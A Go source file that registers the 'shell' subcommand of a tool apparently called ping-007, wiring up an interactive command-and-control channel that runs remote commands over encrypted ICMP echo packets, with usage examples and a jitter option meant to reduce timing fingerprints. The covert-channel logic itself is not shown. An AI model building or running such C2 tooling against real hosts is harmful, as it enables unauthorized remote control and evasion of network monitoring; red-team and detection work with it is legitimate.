//go:build !noc2

package main

import (
	"fmt"

	"ping007/internal/orchestrator"

	"github.com/spf13/cobra"
)

// addShellCommand registers the interactive C2 shell subcommand.
// Excluded from builds that set the "noc2" tag (e.g. make build-no-c2).
func addShellCommand(rootCmd *cobra.Command, orch *orchestrator.Orchestrator) {
	rootCmd.AddCommand(createShellCmd(orch))
}

func createShellCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "shell",
		Short: "Interactive ICMP C2 shell",
		Long: `Start a bidirectional command-and-control channel with a remote host over ICMP.
Commands typed locally are sent as encrypted ICMP echo requests; the remote
agent executes them and returns output inside ICMP echo replies.

Both sides must run ping-007 with the same --password. The remote side is the
one that executes commands (target); this side is the operator console.

Build with -tags noc2 to exclude this command from the binary entirely.`,
		Example: `  # Open an interactive C2 shell to a remote host
  ping-007 shell --target 10.0.0.5 --password "ops-key"

  # With random jitter (0-3s) between packets to reduce timing fingerprint
  ping-007 shell --target 10.0.0.5 --jitter 3s --password "ops-key"`,
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			mode, _ := cmd.Flags().GetString("mode")
			jitterMax, _ := cmd.Flags().GetDuration("jitter")
			password, _ := cmd.Flags().GetString("password")

			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Shell(cmd.Context(), &orchestrator.ShellOptions{
				Target:    target,
				Mode:      mode,
				JitterMax: jitterMax,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address")
	cmd.Flags().String("mode", "interactive", "shell mode: interactive (stdin/stdout) or batch")
	cmd.Flags().Duration("jitter", 0, "max random delay added before each packet (e.g. 3s, 500ms); 0 = disabled")
	cmd.MarkFlagRequired("target")

	return cmd
}
